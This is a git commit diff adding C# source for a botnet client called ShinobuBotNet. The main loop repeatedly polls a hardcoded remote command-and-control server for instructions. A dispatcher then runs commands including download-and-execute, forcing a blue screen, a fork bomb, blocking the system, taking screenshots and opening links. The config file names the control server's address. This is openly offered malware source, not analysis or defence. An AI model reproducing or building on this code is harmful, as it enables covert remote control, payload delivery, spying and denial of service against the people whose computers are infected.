bd2c9d6e2e153c029b2b45ca43bb337ef5ebcdfe
Amadeus <58073614+Amadeus452@users.noreply.github.com>
2020-06-16 18:41:49 +0500

    BETA!

---
+++ ShinobuBotNet/ShinobuBotNet/cMain.cs
@@ -0,0 +1,111 @@
+﻿using System;
+using System.Text.RegularExpressions;
+using System.Threading;
+using System.Net;
+using System.Threading.Tasks;
+using System.Windows;
+
+namespace ShinobuBotNet
+{
+    class cMain
+    {
+        static string last_cmd = string.Empty;
+
+        static void Main(string[] args)
+        {
+            if (System.IO.File.Exists("c0n0ct.ch"))
+            {
+                while (true)
+                {
+                    string id = GetInfo.Get_ID();
+                    string html = web.GetHTML(configs.server + "GetCommand.php?id=" + id);
+
+
+                    if (last_cmd == html)
+                    {
+                        Thread.Sleep(configs.delay);
+                        continue;
+                    }
+                    last_cmd = html;
+
+                    cmd command = new cmd(html);
+                    Execute(command);
+
+                    Thread.Sleep(configs.delay);
+                }
+            }
+
+            else
+            {
+                cheak.creat_cheak_File();
+
+                while (true)
+                {
+                    connect.connect_to_API();
+                    string id = GetInfo.Get_ID();
+                    string html = web.GetHTML(configs.server + "GetCommand.php?id=" + id);
+
+
+                    if (last_cmd == html)
+                    {
+                        Thread.Sleep(configs.delay);
+                        continue;
+                    }
+                    last_cmd = html;
+
+                    cmd command = new cmd(html);
+                    Execute(command);
+
+                    Thread.Sleep(configs.delay);
+                }
+            }
+        }
+
+
+        static void Execute(cmd CMD)
+        {
+            switch (CMD.ComType)
+            {
+                case "open_link":
+                    functions.OpenLink(CMD.ComContent);
+                    break;
+
+                case "download_execute":
+                    functions.DownloadExecute(CMD.ComContent);
+                    break;
+
+                case "exit":
+                    Environment.Exit(0);
+                    break;
+
+                case "ping":
+                    functions.ping();
+                    break;
+
+                case "BSOD":
+                    functions.BSOD();
+                    break;
+
+                case "forkbomb":
+                    functions.forkbomb();
+                    break;
+
+                case "BlockSystem":
+                    functions.BlockSystem(CMD.ComContent);
+                    break;
+
+                case "wallpaper":
+                    functions.wallpaper(CMD.ComContent);
+                    break;
+
+                case "screnshot":
+                    functions.screenshot();
+                    break;
+
+                case "msg_box":
+                    functions.MSG(CMD.ComContent);
+                    break;
+            }
+        }
+    }
+}
---
+++ ShinobuBotNet/ShinobuBotNet/configs.cs
@@ -0,0 +1,11 @@
+﻿namespace ShinobuBotNet
+{
+    class configs
+    {
+        public static string server = "http://f0439478.xsph.ru/";
+
+        public static string spliter = "{split}";
+
+        public static int delay = 3000; // 3 сек
+    }
+}
